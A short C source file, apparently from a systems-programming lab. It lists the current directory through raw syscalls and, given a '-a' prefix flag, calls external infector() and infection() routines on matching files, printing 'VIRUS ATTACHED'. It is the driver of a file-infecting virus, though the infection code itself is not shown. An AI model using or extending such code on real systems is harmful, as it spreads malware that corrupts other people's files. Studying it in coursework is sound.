#include "util.h"

#define BUF_SIZE 8192
#define STDOUT 1
#define SYS_EXIT 1
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_getdents 141


extern int system_call();
extern void infection();
extern void infector();

typedef struct ent {
    int inode;     /* Inode number */
    int offset;     /* Offset to next linux_dirent */
    short len;  /* Length of this linux_dirent */
    char buf[];  /* Filename (null-terminated) */
}ent;


int main(int argc, char *argv[]) {
    int fd;
    int nread; 
    char buf[BUF_SIZE];
    struct ent *dirp;
    int bpos;
    char* prefix = 0;

    /* check for -a{prefix} */
    int i;
    for(i = 1; i < argc ; ++i){
        if (strncmp(argv[i],"-a",2) == 0){
            prefix = argv[i] + 2;
        }
    }

    fd = system_call(SYS_OPEN, ".", 0,0);
    if (fd < 0) {
        system_call(SYS_EXIT, 0x55);
    }
       
    nread = system_call(SYS_getdents, fd, buf, BUF_SIZE);
    if (nread < 0) {
        system_call(SYS_EXIT, 0x55);
    }

    for (bpos = 0; bpos < nread;) {
        dirp = (struct ent *) (buf + bpos);
        system_call(SYS_WRITE, STDOUT, dirp->buf, strlen(dirp->buf));
        if (prefix && strncmp(dirp->buf,prefix,strlen(prefix)) == 0){
            system_call(SYS_WRITE, STDOUT," VIRUS ATTACHED", 15);
            system_call(SYS_WRITE, STDOUT,"\n", 1);
            infector(dirp->buf);
            infection();
        }
        system_call(SYS_WRITE, STDOUT,"\n", 1);
        bpos += dirp->len;
    }

    system_call(SYS_CLOSE, ".", 0,0);
    
    return 0;
}